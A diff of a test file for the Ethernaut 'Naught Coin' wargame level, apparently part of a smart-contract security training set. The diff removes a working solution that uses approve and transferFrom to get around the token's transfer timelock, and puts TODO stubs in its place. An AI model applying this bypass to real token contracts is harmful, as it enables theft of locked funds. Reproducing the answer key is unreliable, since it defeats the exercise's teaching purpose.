@@ -1,7 +1,7 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
 from pytypes.contracts.lv15_naught_coin import NaughtCoin
-
+# TODO You can import your our own smart contract(s) here.
 
 @default_chain.connect()
 def test_lv15():
@@ -11,18 +11,7 @@ def test_lv15():
     ethernaut.check_lv15(contract)
 
 def exploit_lv15(contract: NaughtCoin, attacker: Account, other_account: Account):
-    # Attack vector: there are multiple ways, how to transfer ERC-20 tokens
-    # Training: know methods of ERC-20 standard
-    
-    contract.approve(
-        spender = other_account,
-        amount  = contract.balanceOf(attacker.address),
-        from_   = attacker
-    )
-    
-    contract.transferFrom(
-        sender    = attacker.address,
-        recipient = other_account.address,
-        amount    = contract.balanceOf(attacker.address),
-        from_     = other_account
-    )
+    # TODO Transfer the NaugtyCoins to the another address.
+    # TODO You can import your our own smart contract(s) here.
+    # TODO Code here ...
+    pass
